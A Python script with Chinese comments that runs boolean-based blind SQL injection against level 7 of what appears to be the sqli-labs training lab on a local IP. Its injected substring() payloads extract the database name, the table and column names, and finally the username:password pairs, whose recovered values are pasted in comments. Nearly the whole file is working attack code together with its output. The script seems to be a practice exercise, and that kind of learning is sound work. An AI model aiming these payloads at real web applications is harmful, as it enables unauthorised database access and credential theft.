import requests
import re
url="http://192.168.68.130/sqli/Less-7/"

response = requests.get(url)

if response.status_code != 200:
    print(response.status_code)
    exit()
#print(response.text)

#爆破数据库
#其他得也只是单纯修改find的值
"""database=""
for i in range(1,100):  #长度，一般会设置长一点
    for j in range(33,127): #ascii可见字符范围
        find="database()"
        payload="?id=1')) and substring({},{},1)='{}' --+".format(find,i,chr(j))
        response = requests.get(url+payload)
        if b'You are in.... Use outfile......' in response.text.encode():
            database+=chr(j)
            break
print(database)"""
#SECURITY+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#爆破表
"""tables=""
for i in range(1,100):
    for j in range(33,127):
        find="(select group_concat(table_name) from information_schema.tables where table_schema=database())"
        payload="?id=1')) and substring({},{},1)='{}' --+".format(find,i,chr(j))
        response = requests.get(url+payload)
        if b'You are in.... Use outfile......' in response.text.encode():
            tables+=chr(j)
            break
print(tables)"""
#EMAILS,REFERERS,UAGENTS,USERS++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#爆破列
"""columns=""
for i in range(1,100):
    for j in range(33,127):
        find="(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())"
        payload="?id=1')) and substring({},{},1)='{}' --+".format(find,i,chr(j))
        response = requests.get(url+payload)
        if b'You are in.... Use outfile......' in response.text.encode():
            columns+=chr(j)
            break
print(columns)"""
#ID,USERNAME,PASSWORD+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#爆破值
values=""
for i in range(1,100):
    for j in range(33,127):
        find="(select group_concat(username,':',password) from users)"
        payload="?id=1')) and substring({},{},1)='{}' --+".format(find,i,chr(j))
        response = requests.get(url+payload)
        if b'You are in.... Use outfile......' in response.text.encode():
            values+=chr(j)
            break
print(values)
#DUMB:DUMB,ANGELINA:I-KILL-YOU,DUMMY:P@SSWORD,SECURE:CRAPPY,STUPID:STUPIDITY,SUPERMAN:GENIOUS,BATMAN
#可以看到并没有回显完，说明需要修改i的长度，这里就不演示了